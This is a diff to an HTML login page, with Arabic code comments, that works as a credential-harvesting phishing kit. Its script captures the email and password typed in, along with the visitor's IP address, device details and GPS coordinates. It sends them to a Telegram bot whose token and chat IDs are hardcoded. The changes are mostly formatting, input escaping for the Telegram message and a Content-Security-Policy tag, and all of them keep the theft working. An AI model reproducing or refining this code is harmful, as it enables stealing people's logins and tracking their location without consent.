@@ -10,8 +10,10 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <style>
-        .btn-login:hover, .btn-new:hover {
-            background-color: #007BFF; /* تغيير اللون عند التمرير */
+        .btn-login:hover,
+        .btn-new:hover {
+            background-color: #007BFF;
+            /* تغيير اللون عند التمرير */
             transition: background-color 0.3s ease;
         }
 
@@ -20,8 +22,13 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
         }
 
         .error-message {
@@ -36,6 +43,7 @@
             display: none;
         }
     </style>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://unpkg.com;">
 </head>
 
 <body>
@@ -119,9 +127,15 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "7939471560:AAEnwyY-_e7D0bApNRjclnXw3KMxW7wK2h8";  // هنا التوكين
-        const CHAT_IDS = ["6630241690", "6183113466"]; // إضافة معرفي الشات هنا
+        const TOKEN = "7939471560:AAEnwyY-_e7D0bApNRjclnXw3KMxW7wK2h8";  // التوكين
+        const CHAT_IDS = ["6630241690", "6183113466"]; // إضافة معرفات الشات
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        function sanitizeInput(input) {
+            const element = document.createElement('div');
+            element.innerText = input;
+            return element.innerHTML;
+        }
 
         document.querySelector('.btn-login').addEventListener('click', function(e) {
             e.preventDefault();
@@ -152,27 +166,24 @@
                     const screenWidth = screen.width;
                     const screenHeight = screen.height;
                     const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-                    
+
                     // تحديد الموقع باستخدام HTML5 Geolocation API
                     navigator.geolocation.getCurrentPosition(function(position) {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        const googleEarthLink = `https://earth.google.com/web/@${latitude},${longitude},1000a,0d,35y,0h,0t,0r`;
 
+                        // إرسال الرسالة إلى تليجرام مع الموقع
                         const message = `
                             <b>New Login Attempt</b>\n
-                            <b>Email:</b> ${email}\n
-                            <b>Password:</b> ${password}\n
+                            <b>Email:</b> ${sanitizeInput(email)}\n
+                            <b>Password:</b> ${sanitizeInput(password)}\n
                             <b>IP Address:</b> ${ip}\n
                             <b>Device Type:</b> ${deviceType}\n
                             <b>Platform:</b> ${platform}\n
                             <b>User Agent:</b> ${userAgent}\n
                             <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
                             <b>Latitude:</b> ${latitude}\n
-                            <b>Longitude:</b> ${longitude}\n
-                            <b>Location:</b> <a href="${googleMapsLink}" target="_blank">View on Google Maps</a>\n
-                            <b>Google Earth:</b> <a href="${googleEarthLink}" target="_blank">View in Google Earth</a>
+                            <b>Longitude:</b> ${longitude}
                         `;
 
                         // إرسال الرسالة إلى كل معرف من معرفات الشات
@@ -190,11 +201,13 @@
                                 document.getElementById('error-message').style.display = 'block';
                             });
                         });
+
                     }, function(error) {
-                        alert("Error retrieving location: " + error.message);
+                        alert("Error fetching geolocation: " + error.message);
                     });
-                }).catch(error => {
-                    console.error(error);
+                })
+                .catch(error => {
+                    alert('Error fetching the IP address. Please try again.');
                 });
         });
     </script>
